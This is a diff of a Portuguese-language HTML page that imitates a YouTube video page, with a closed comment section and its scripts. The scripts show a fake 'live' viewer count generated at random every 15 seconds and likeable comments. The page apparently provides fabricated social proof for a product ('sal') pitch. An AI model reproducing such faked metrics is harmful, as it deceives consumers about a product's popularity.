                     <div class="text">@Ricardo Dauto Que incrível! Também estou a pensar experimentar. Onde compro esse sal?</div>
                     <div class="actions">
                         <span class="like-count"><i class="fas fa-thumbs-up"></i> 34</span>
@@ -819,95 +491,104 @@
 
             <h4 class="comments-closed">Este post já não está a receber comentários!</h4>
         </div>
-    </main>
+
+    </div>
 
     <script>
-        const likeBtn = document.getElementById('likeBtn');
-        const likeCountSpan = document.getElementById('likeCount');
-        let likeCount = 5200;
-        let liked = false;
+        /* ============================================================
+           PARTÍCULAS DE FUNDO
+        ============================================================ */
+        (function() {
+            const canvas = document.getElementById('particles');
+            const ctx = canvas.getContext('2d');
+            let particles = [];
+            let w, h;
 
-        likeBtn.addEventListener('click', function(e) {
-            e.preventDefault();
-            if (!liked) {
-                likeCount += 1;
-                liked = true;
-                likeBtn.classList.add('liked');
-                likeCountSpan.textContent = formatNumber(likeCount);
-                likeBtn.style.transform = 'scale(1.1)';
-                setTimeout(() => { likeBtn.style.transform = 'scale(1)'; }, 150);
-            } else {
-                likeCount -= 1;
-                liked = false;
-                likeBtn.classList.remove('liked');
-                likeCountSpan.textContent = formatNumber(likeCount);
+            function resize() {
+                w = canvas.width = window.innerWidth;
+                h = canvas.height = window.innerHeight;
             }
-        });
+            resize();
+            window.addEventListener('resize', resize);
 
-        function formatNumber(num) {
-            if (num >= 1000) {
-                return (num / 1000).toFixed(1).replace('.', ',') + ' mil';
+            for (let i = 0; i < 40; i++) {
+                particles.push({
+                    x: Math.random() * w,
+                    y: Math.random() * h,
+                    r: Math.random() * 1.5 + 0.3,
+                    vx: (Math.random() - 0.5) * 0.3,
+                    vy: (Math.random() - 0.5) * 0.3,
+                    o: Math.random() * 0.4 + 0.1
+                });
             }
-            return num.toString();
+
+            function draw() {
+                ctx.clearRect(0, 0, w, h);
+                particles.forEach(p => {
+                    p.x += p.vx;
+                    p.y += p.vy;
+                    if (p.x < 0) p.x = w;
+                    if (p.x > w) p.x = 0;
+                    if (p.y < 0) p.y = h;
+                    if (p.y > h) p.y = 0;
+                    ctx.beginPath();
+                    ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+                    ctx.fillStyle = `rgba(245, 166, 35, ${p.o})`;
+                    ctx.fill();
+                });
+                requestAnimationFrame(draw);
+            }
+            draw();
+        })();
+
+        /* ============================================================
+           CONTADOR AO VIVO
+        ============================================================ */
+        const liveSpan = document.getElementById('liveCount');
+        if (liveSpan) {
+            setInterval(() => {
+                const base = 1234;
+                const variation = Math.floor(Math.random() * 400) - 200;
+                const val = Math.max(800, base + variation);
+                liveSpan.textContent = val.toLocaleString('pt-PT');
+            }, 15000);
         }
 
-        const viewSpan = document.getElementById('viewCount');
-        let views = 6892;
-        setInterval(() => {
-            const delta = Math.floor(Math.random() * 10) - 3;
-            views = Math.max(6800, views + delta);
-            if (viewSpan) viewSpan.textContent = views.toLocaleString('pt-PT');
-        }, 8000);
+        /* ============================================================
+           LIKES NOS COMENTÁRIOS
+        ============================================================ */
+        document.querySelectorAll('.comment .like-count').forEach(el => {
+            const icon = el.querySelector('i');
+            const textNode = el.childNodes[1];
+            let count = parseInt(textNode.textContent.trim()) || 0;
+            let liked = false;
+            el.addEventListener('click', function(e) {
+                e.stopPropagation();
+                if (!liked) {
+                    count += 1;
+                    liked = true;
+                    el.classList.add('liked');
+                    icon.style.color = '#f5a623';
+                } else {
+                    count -= 1;
+                    liked = false;
+                    el.classList.remove('liked');
+                    icon.style.color = '';
+                }
+                textNode.textContent = ' ' + count;
+            });
+        });
 
-        const liveSpan = document.getElementById('liveCount');
-        setInterval(() => {
-            const base = 1234;
-            const variation = Math.floor(Math.random() * 400) - 200;
-            const val = Math.max(800, base + variation);
-            liveSpan.textContent = val.toLocaleString('pt-PT');
-        }, 15000);
-
+        /* ============================================================
+           REPLY (FECHADO)
+        ============================================================ */
         document.querySelectorAll('.reply').forEach(el => {
             el.addEventListener('click', function(e) {
                 e.stopPropagation();
                 alert('💬 Os comentários estão fechados para esta demonstração.');
             });
         });
-
-        document.querySelectorAll('.comment .like-count').forEach(el => {
-            const icon = el.querySelector('i');
-            const textNode = el.childNodes[1];
-            let count = parseInt(textNode.textContent.trim()) || 0;
-            el.style.cursor = 'pointer';
-            el.addEventListener('click', function(e) {
-                e.stopPropagation();
-                count += 1;
-                textNode.textContent = ' ' + count;
-                icon.style.color = '#065fd4';
-                setTimeout(() => { icon.style.color = ''; }, 500);
-            });
-        });
-
-        const subBtn = document.getElementById('subBtn');
-        if (subBtn) {
-            subBtn.addEventListener('click', function() {
-                if (this.classList.contains('subscribed')) {
-                    this.classList.remove('subscribed');
-                    this.textContent = 'Inscrever-me';
-                    this.style.background = '#cc0000';
-                    this.style.color = '#fff';
-                    this.style.border = 'none';
-                } else {
-                    this.classList.add('subscribed');
-                    this.textContent = 'Inscrito';
-                    this.style.background = '#272727';
-                    this.style.color = '#f1f1f1';
-                    this.style.border = '1px solid #3f3f3f';
-                }
-            });
-        }
-
-        console.log('🔥 YouTube White Mode carregado com sucesso!');
     </script>
+
 </body>
 </html>
